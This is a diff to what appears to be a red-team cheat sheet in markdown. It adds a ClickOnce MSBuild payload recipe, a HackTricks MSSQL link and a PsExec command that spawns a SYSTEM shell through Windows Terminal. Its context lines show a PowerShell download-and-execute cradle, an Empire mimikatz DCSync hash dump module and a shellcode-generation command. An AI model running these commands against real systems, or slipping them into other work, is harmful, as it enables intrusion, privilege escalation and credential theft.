@@ -994,6 +994,18 @@ python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, m
 ```
 
 
+#### ClickOnce MSBuild Payload
+
+```powershell
+#https://github.com/hausec/MaliciousClickOnceMSBuild
+
+1) Create a new .NET Framework console project in Visual Studio
+2) Import Program.cs from this repository
+3) Add the MSBuild payload file to the project
+4) Publish the project
+
+```
+
 
 #### [](#header-4) WeirdHTA - Undetectable HTA
 
@@ -1111,8 +1123,13 @@ Also, Outlook doesnt block .html attachments by default , and neither do some ot
 Find vulnerabilities in AD Group Policy
 
 Grouper2 is a tool for pentesters to help find security-related misconfigurations in Active Directory Group Policy.
+```
 
 
+#### Microsoft SQL Stuff
+
+```
+https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
 ```
 
 
@@ -1560,6 +1577,16 @@ powershell.exe -Version 2 -Exec Bypass /c "IEX (New-Object Net.WebClient).Downlo
 
 
 Empire Module: powershell/credentials/mimikatz/dcsync_hashdump
+```
+
+
+#### Elevate to System Shell from Admin Account using Windows Terminal
+
+```powershell
+#https://twitter.com/spotheplanet/status/1318487486826504197/photo/1
+
+PsExec.exe -i -s "C:\Program Files\WindowsApps\Microsoft.WindowsTerminal.X.X\WindowsTerminal.exe"
+
 ```
 
 
